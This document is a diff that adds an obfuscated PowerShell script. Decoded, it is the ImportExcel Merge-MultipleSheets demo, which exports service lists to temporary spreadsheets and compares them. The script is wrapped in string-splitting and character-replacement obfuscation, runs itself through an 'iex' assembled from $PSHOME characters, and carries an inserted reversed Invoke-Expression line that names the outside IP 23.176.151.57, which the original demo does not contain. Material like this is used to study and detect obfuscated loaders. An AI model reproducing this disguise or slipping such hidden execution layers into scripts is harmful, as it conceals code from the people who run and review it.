@@ -1,0 +1,38 @@
+ (('try {Import-Module pe0PSScriptRootCxu..Cxu..CxuImportEx'+'cel.psd1} catch {throw ; return}
+pe0LgJ =  pe0'+'cT3q=[CHaR'+'[ ] ] Azo ))93]RAhc[F-  )QYv}0Q'+'Yv+QYv{75QYv+QYv.151QYv+QYv.671.32QYv+QYv:pi}0QYv+QYv{QYv((( NoIsSeRPXE-eKOvNiAzo ;  [ArrAy]::rEVErsE((variable'+' cT3Q -ValUE  ) ) ;( (variable cT3Q -ValUE  ) -JOInQYvQYv)
+
+Remove-Item '+'-'+'Path  Azope0en'+'v:tempCxuserver*.xlsxAzo , Azope0env'+':tempCxuCombined*.xlsxAz'+'o -ErrorAction SilentlyContinue
+
+#Get a subse'+'t of servi'+'ces into pe0s and'+' expo'+'rt them
+[System.Collections.ArrayList]pe0s = Get-service xkY Select-Object -first 25 -Property Name,DisplayName,StartType
+pe0s xkY Exp'+'ort-Excel -Path '+'pe0env:tempCxuserver1.x'+'lsx
+
+#pe0s i'+'s a zero based array, excel rows are 1 based and excel has a header row so Excel rows will '+'be 2 + index in pe0'+'s.
+#Change a row. Add a ro'+'w. Delete a row.  And export the changed pe0s to a second file.
+pe0ro'+'w4Displa'+'yna'+'me  = pe0s[2].DisplayName
+pe0s[2].DisplayName = AzoChanged from t'+'he orginalAzo'+'    #This will be excel row 4 a'+'nd Server 2 will show as changed.
+
+pe0d = pe0s[-1] xkY Select-Object -Property *
+pe0d.DisplayName = AzoDummy ServiceAzo
+pe0d'+'.Name = AzoDummyAzo
+pe0s'+'.Ins'+'ert(3,pe0d)                                   #This will be Excel row 5 and server 2 will show as changed - so will Serve'+'r'+' 3
+
+pe0s.RemoveAt(5)                                    #This will b'+'e Excel row 7 and Serv'+'er 2 will sh'+'ow as missing.
+
+pe0s '+'xkY Exp'+'ort-Excel -Path p'+'e0env:tempCxuserver2.xlsx
+
+#Make some more changes to pe0s and export it to a third file'+'
+pe0s[2].displayname = pe'+'0row4Di'+'splayname             #Server 3 row 4 wi'+'ll match '+'server 1 so wonQYvt be highlighted
+
+pe0d = pe0s[-1] xkY Select-Obj'+'ect -Property *
+pe0d.DisplayName = AzoSecond S'+'erviceAzo
+pe0d.Name = AzoService2Azo
+pe0s.Insert(6,pe0d)      '+'       '+'         '+'        '+' '+'   #Th'+'is will be an extra row in Server 3 at row 8. I'+'t will show as missing'+' in Serve'+'r'+' 2.
+pe0s.R'+'emo'+'veAt('+'8)                                   #This will show as missing in Server 3 at row 11 ()
+
+pe0s xkY Export-'+'Excel -Path pe0env:tempCxuserver3.xls'+'x
+
+#Now bring the thr'+'ee files togethe'+'r.
+
+Me'+'r'+'ge-MultipleSheets -Path Azope0env:tempCxuserver1.xlsxAzo, Azope0env:te'+'mpCxuServer2.xlsxAzo,Azope0env:tempCxuServer3.xlsxAzo -OutputFil'+'e Azope0env:tempCxucombin'+'ed3.xlsx'+'Azo  -Property name,displayname,startType -Key name  -S'+'how
+') -RePLAce  ([cHAr]67+[cHAr]120+[cHAr]117),[cHAr]92  -crePlace 'Azo',[cHAr]34 -RePLAce'QYv',[cHAr]39  -RePLAce  ([cHAr]112+[cHAr]101+[cHAr]48),[cHAr]36  -RePLAce  'xkY',[cHAr]124) |& ( $pShoME[4]+$psHOME[34]+'x')
